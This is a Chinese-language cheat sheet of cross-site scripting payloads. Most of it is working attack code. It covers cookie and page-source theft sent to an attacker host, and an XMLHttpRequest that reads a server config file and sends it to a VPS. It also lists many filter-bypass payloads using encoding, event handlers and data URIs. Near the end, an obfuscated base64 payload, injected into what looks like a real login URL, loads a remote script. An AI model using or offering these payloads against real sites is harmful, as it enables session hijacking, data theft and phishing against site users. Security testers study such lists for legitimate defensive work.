# xss注入

## 常用的xss语句

读cookie:document.location='http://ip或域名/?'+document.cookie

读源码:document.location='http://ip或域名/?'+btoa(document.body.innerHTML)

### 访问网页

```javascript
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///var/www/html/config.php");
```

### 重定向

` document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);`

## ??



如果弹窗成功，说明存在xss漏洞，下面是几种常见的跨站攻击方法。

```
<script>alert(document.cookie)</script>闭合或注释之前的语句"/><script>alert(document.cookie)</script><!----><script>alert(document.cookie)</script><!--
```

 

其他写法

```
"onclick="alert(document.cookie)
</dd><script>alert(/xss/)</script>
<script>alert(/liscker/);</script>"><img%20src=1%20onerror=alert(1)><marquee/onstart="confirm`1`">< a href=javascript:alert(1)>
```

 

## **反射型XSS Poc:**

 

**alert()函数过滤：**

```
<script>alert('xss')</script> 
<script>confirm('xss')</script> 
<script>prompt('xss')</script> 
```

 

<script>标签过滤：

```
<a href="onclick=alert('xss')"> click</a>123"><a/href=//www.baidu.com/>XssTest</a>
<img src=# onerror=alert('xss')></img>
<iframe onload=alert('xss')>
```

 

**base64加密**

```
<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
```

 

**setTimeout**

```
<svg/onload=setTimeout('ale'+'rt(1)',0)>
```

 

**过滤双引号**

```
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
```

 

**chrome**

```
<img src ?itworksonchrome?\/onerror = alert(1)>
```

 

**data形式**

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></object>
<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg></embed>
<script src=data:%26comma;alert(1)></script>
```

 

**ontoggle**

```
<details open ontoggle="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#24050;&#26159;&#40644;&#26127;&#29420;&#33258;&#24833;&#65292;&#19968;&#26525;&#32418;&#26447;&#20986;&#22681;&#26469;&#39;&#41;">
```

 

**frame**

```
<frame src="javascript:alert(1)">
<frame src="javascript:%20%0aalert%20%0d %09(1)">
<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />2134'></textarea><script>alert(/xss/)</script><textarea>
```

 

**url加密绕圆括号**

```
<svg/onload=alert(1)>
<svg onload='JavascRipT:alert%281%29'>
<svg/onload ="location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'">
```

 

 **XSS漏洞利用方式：**



```
<script>window.location="http://www.baidu.com"</script>   重定向钓鱼
<script>window.location="http://1.1.1.1/cookie.php?cookie="+document.cookie;</script>  接受客户端cookie
<script>new Image().src="http://1.1.1.1/c.php?output="+document.cookie; </script> http://login.xxx.com/sso/m/mobile-login.do?next_page=http://m.xxx.com&f=coursek12xss",}});setTimeout(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKS5zcmM9Jy8vZHQzMDEuY29tLzAuanMnOw=='),0);({validate: {//
```



 

###  XSS变种

XSS变种的类型在于JavaScript能执行的位置有多少。

　　1）confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。

```
"/><ScRiPt>confirm(9174)</ScRiPt>
```

　　2）跳转链接

```
<a/href=//www.baidu.com/>XssTest</a>
<a href="javascript:alert(1)">x</a>
```

 　　3）img类型的xss

```
<img src='#' onerror='alert("XSS")' >
<img src='' onerror=alert(/poc/)>
```

　　4）对于过滤<>

```
%27;alert%28/aa/%29;a=%27
```

 　　5）邮箱系统，存储型

```
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

 　　6）inframe框架执行JS

```
<iframe src="javascript:alert(1)"></iframe>
```